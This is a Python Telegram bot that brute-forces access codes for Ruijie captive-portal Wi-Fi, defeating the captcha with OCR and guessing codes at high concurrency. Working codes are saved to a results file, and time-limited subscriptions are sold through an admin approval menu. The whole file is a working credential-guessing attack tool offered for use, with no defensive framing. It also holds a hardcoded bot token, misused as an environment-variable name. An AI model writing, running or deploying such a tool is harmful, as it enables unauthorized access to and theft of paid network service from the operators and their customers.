import os
import asyncio
import aiohttp
import json
import time
import datetime
import random
import string
import cv2
import ddddocr
import itertools
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web

# Railway Environment Variables မှတစ်ဆင့် တန်ဖိုးများကို လှမ်းဖတ်ခြင်း
API_TOKEN = os.getenv( '8545879694:AAHrZvFatoCxQl0NqBiuUEYHUTtCDuB9FZw')
ADMIN_ID = int(os.getenv('ADMIN_ID', '6658845504')) 
PORT = int(os.getenv('PORT', '8080')) 

bot = AsyncTeleBot(API_TOKEN)

# Global Storage States
user_data = {}        
approved_users = {}   # {chat_id: expire_timestamp} 

SUCCESS_CODE = asyncio.Queue()
limited_codes = []
success_messages = []
scanner_tasks = {}    
# OCR Engine ကို Global အနေဖြင့် Initialize လုပ်ခြင်း
ocr = ddddocr.DdddOcr(show_ad=False)

async def get_session_id(session, base_url):
    async with session.get(f"{base_url}/api/auth/captcha/sid") as resp:
        res = await resp.json()
        return res.get("sessionId")

async def process_captcha_ocr(image_bytes):
    text = ocr.classification(image_bytes)
    return text

async def perform_check(session, base_url, code, chat_id):
    try:
        session_id = await get_session_id(session, base_url)
        captcha_url = f"{base_url}/api/auth/captcha/image?sessionId={session_id}"
        async with session.get(captcha_url) as img_resp:
            img_bytes = await img_resp.read()
            
        auth_code = await process_captcha_ocr(img_bytes)
        
        payload = {
            "accessCode": code,
            "sessionId": session_id,
            "authCode": auth_code
        }
        
        api_url = "https://ruijienetworks.com"
        async with session.post(api_url, json=payload) as resp:
            response = await resp.json()
            
            if 'logonUrl' in response:
                total_minutes = response.get("totalMinutes", 0)
                plan_details = "Unlimited Plan" if total_minutes == 0 else f"{total_minutes} Mins Plan"
                
                success_item = {"code": code, "details": plan_details, "timestamp": time.time()}
                await SUCCESS_CODE.put(success_item)
                success_messages.append(f"✅ Found: {code} ({plan_details})")
                return "SUCCESS"
                
            elif 'STA' in response:
                limited_codes.append(code)
                return "LIMITED"
                
            return "INVALID"
    except Exception:
        return "RETRY"
def iter_codes(mode):
    if mode == '6':
        for i in range(1000000): yield f"{i:06d}"
    elif mode == '7':
        for i in range(10000000): yield f"{i:07d}"
    elif mode == '8':
        while True: yield "".join(random.choices(string.digits, k=8))
    elif mode == 'ascii-lower':
        for length in range(4, 7):
            for p in itertools.product(string.ascii_lowercase, repeat=length): yield "".join(p)
    elif mode == 'all':
        while True: yield "".join(random.choices(string.ascii_lowercase + string.digits, k=6))

def format_progress(user_info):
    elapsed = max(1, time.time() - user_info.get('start_time', time.time()))
    speed = int(user_info.get('checked', 0) / elapsed)
    return (
        f"📊 **Scanner Progress Status**\n\n"
        f"📦 **Checked:** {user_info.get('checked', 0)}\n"
        f"⚡ **Speed:** {speed} req/s\n"
        f"✅ **Found:** {user_info.get('found', 0)}\n"
        f"🔁 **Retry:** {user_info.get('retry', 0)}\n"
    )

async def run_bruteforce(chat_id):
    ctx = user_data[chat_id]
    base_url = ctx['session_url']
    mode = ctx['mode']
    
    connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        generator = iter_codes(mode)
        ctx['start_time'] = time.time()
        
        while ctx['status'] == 'running':
            # စကန်ဖတ်နေစဉ်အတွင်း သက်တမ်းကုန်သွားပါက ရပ်တန့်ရန်
            if chat_id != ADMIN_ID and time.time() > approved_users.get(chat_id, 0):
                ctx['status'] = 'idle'
                await bot.send_message(chat_id, "⚠️ **Access Expired!** Package ended.")
                break

            tasks = []
            for _ in range(100):
                try: tasks.append(perform_check(session, base_url, next(generator), chat_id))
                except StopIteration: break
                    
            if not tasks: break
            results = await asyncio.gather(*tasks)
            
            for res in results:
                ctx['checked'] += 1
                if res == "SUCCESS": ctx['found'] += 1
                elif res == "RETRY": ctx['retry'] += 1
            
            if ctx['checked'] % 500 == 0:
                try: await bot.send_message(chat_id, format_progress(ctx))
                except Exception: pass
            await asyncio.sleep(0.01)
def is_user_valid(chat_id):
    if chat_id == ADMIN_ID: return True
    return time.time() < approved_users.get(chat_id, 0)

@bot.message_handler(commands=['start'])
async def send_welcome(message):
    await bot.reply_to(message, "👋 Ruijie Scanner Live on Railway!\nCommands:\n/key - Request Key\n/input - Set URL\n/scan - Start\n/stop - Stop\n/result - Hits\n/status - Admin")

@bot.message_handler(commands=['key'])
async def handle_key_auth(message):
    chat_id = message.chat.id
    if is_user_valid(chat_id):
        if chat_id == ADMIN_ID: expire_str = "Unlimited (Admin)"
        else: expire_str = datetime.datetime.fromtimestamp(approved_users[chat_id]).strftime('%Y-%m-%d %H:%M:%S')
        return await bot.reply_to(message, f"✅ Access is active.\n📅 Expires on: `{expire_str}`")
    
    admin_markup = InlineKeyboardMarkup()
    admin_markup.add(InlineKeyboardButton("✅ Approve", callback_data=f"adm_app_{chat_id}"), InlineKeyboardButton("❌ Reject", callback_data=f"adm_rej_{chat_id}"))
    await bot.send_message(ADMIN_ID, f"🔔 **New Subscription Request!**\n🆔 ID: `{chat_id}`", reply_markup=admin_markup)
    await bot.reply_to(message, "⏳ Request sent to Admin. Waiting for license package allocation...")

@bot.callback_query_handler(func=lambda call: call.data.startswith('adm_'))
async def process_admin_callbacks(call):
    if call.message.chat.id != ADMIN_ID: return
    _, action, target_id = call.data.split("_")
    target_id = int(target_id)
    
    if action == "app":
        time_markup = InlineKeyboardMarkup()
        time_markup.add(
            InlineKeyboardButton("1 Day", callback_data=f"dur_1_{target_id}"), 
            InlineKeyboardButton("7 Days", callback_data=f"dur_7_{target_id}"),
            InlineKeyboardButton("30 Days", callback_data=f"dur_30_{target_id}")
        )
        await bot.edit_message_text(f"⚙️ **Select Validity Package** for User ID `{target_id}`:", ADMIN_ID, call.message.message_id, reply_markup=time_markup)
    elif action == "rej":
        approved_users.pop(target_id, None)
        await bot.edit_message_text(f"❌ Rejected `{target_id}`", ADMIN_ID, call.message.message_id)
    await bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('dur_'))
async def process_duration_callback(call):
    if call.message.chat.id != ADMIN_ID: return
    _, days, target_id = call.data.split("_")
    days, target_id = int(days), int(target_id)
    
    approved_users[target_id] = time.time() + (days * 86400)
    user_data[target_id] = {'status': 'idle', 'checked': 0, 'found': 0, 'retry': 0}
    expire_str = datetime.datetime.fromtimestamp(approved_users[target_id]).strftime('%Y-%m-%d %H:%M:%S')
    
    try: await bot.send_message(target_id, f"🎉 **Access Granted!**\n🎁 Package Assigned: **{days} Days**\n📅 Expires on: `{expire_str}`")
    except Exception: pass
    await bot.edit_message_text(f"✅ Active `{target_id}` for {days} Days (Until: {expire_str}).", ADMIN_ID, call.message.message_id)
    await bot.answer_callback_query(call.id, text=f"Assigned {days} Days.")
@bot.message_handler(commands=['input'])
async def handle_input_session(message):
    chat_id = message.chat.id
    if not is_user_valid(chat_id): return
    msg_parts = message.text.split(" ", 1)
    if len(msg_parts) < 2: return await bot.reply_to(message, "⚠️ Format: `/input https://url.com`")
    url = msg_parts[1].strip()
    user_data[chat_id]['session_url'] = url
    await bot.reply_to(message, f"🔗 URL locked: {url}")

@bot.message_handler(commands=['scan'])
async def handle_scan_setup(message):
    chat_id = message.chat.id
    if not is_user_valid(chat_id) or 'session_url' not in user_data.get(chat_id, {}): return
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("Mode 6", callback_data="set_mode_6"), 
        InlineKeyboardButton("Mode 7", callback_data="set_mode_7"),
        InlineKeyboardButton("Mode 8", callback_data="set_mode_8"),
        InlineKeyboardButton("ASCII Lower", callback_data="set_mode_ascii"),
        InlineKeyboardButton("All Mixed", callback_data="set_mode_all")
    )
    await bot.send_message(chat_id, "⚙️ Choose Pattern:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('set_mode_'))
async def process_mode_callback(call):
    chat_id = call.message.chat.id
    if not is_user_valid(chat_id): return
    user_data[chat_id]['mode'] = call.data.replace("set_mode_", "")
    user_data[chat_id]['status'] = 'running'
    await bot.edit_message_text("🚀 Bruteforce Initiated!", chat_id, call.message.message_id)
    scanner_tasks[chat_id] = asyncio.create_task(run_bruteforce(chat_id))

@bot.message_handler(commands=['stop'])
async def handle_stop_execution(message):
    chat_id = message.chat.id
    if chat_id in scanner_tasks:
        user_data[chat_id]['status'] = 'idle'
        scanner_tasks[chat_id].cancel()
        del scanner_tasks[chat_id]
        await bot.reply_to(message, "🛑 Scan stopped.")

@bot.message_handler(commands=['result'])
async def handle_print_results(message):
    try:
        with open('result.json', 'r') as f: data = json.load(f)
        await bot.reply_to(message, f"📋 **JSON Hits Saved:**\n\n```json\n{json.dumps(data[:10], indent=2)}\n```")
    except FileNotFoundError:
        await bot.reply_to(message, "📂 Repository empty.")

@bot.message_handler(commands=['status'])
async def handle_admin_status(message):
    if message.chat.id != ADMIN_ID: return
    active_scans = sum(1 for u in user_data.values() if u.get('status') == 'running')
    await bot.reply_to(message, f"🖥️ **Dashboard**\n\n🔥 Active Scans: {active_scans}\n👥 Registered Users: {len(approved_users)}")

async def github_update_scheduler():
    while True:
        await asyncio.sleep(80)
        if not SUCCESS_CODE.empty():
            items = []
            while not SUCCESS_CODE.empty(): items.append(await SUCCESS_CODE.get())
            try:
                with open('result.json', 'r+') as f:
                    data = json.load(f)
                    data.extend(items)
                    f.seek(0)
                    json.dump(data, f, indent=4)
            except FileNotFoundError:
                with open('result.json', 'w') as f: json.dump(items, f, indent=4)
            print(f"[Backup] Synchronized {len(items)} items.")

async def main():
    # Railway App Integration Web Server
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="Ruijie Bot Engine is Live"))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', PORT).start()
    
    asyncio.create_task(github_update_scheduler())
    print("[+] Polling Engine online. System Deploy Successful.")
    await bot.polling(non_stop=True)

if __name__ == '__main__':
    asyncio.run(main())
